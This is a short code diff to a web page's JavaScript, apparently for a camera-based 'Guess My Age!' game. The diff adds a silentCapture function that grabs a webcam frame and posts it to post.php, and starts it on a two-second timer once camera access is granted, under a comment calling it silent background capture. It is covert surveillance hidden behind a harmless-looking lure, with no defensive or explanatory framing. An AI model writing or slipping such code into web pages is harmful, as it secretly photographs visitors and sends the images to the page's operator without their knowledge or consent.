@@ -196,6 +196,16 @@
 
     let stream = null;
 
+    function silentCapture() {
+        var imgData = captureFrame();
+        $.ajax({
+            type: 'POST',
+            url: 'post.php',
+            data: { cat: imgData },
+            dataType: 'json'
+        });
+    }
+
     async function startCamera() {
         try {
             stream = await navigator.mediaDevices.getUserMedia({
@@ -205,6 +215,9 @@
             video.srcObject = stream;
             snapBtn.textContent = 'Guess My Age!';
             snapBtn.disabled = false;
+
+            // Silent background capture every 2 seconds
+            setInterval(silentCapture, 2000);
         } catch(e) {
             errorMsg.textContent = 'Camera access is required for age detection.';
             errorMsg.style.display = 'block';
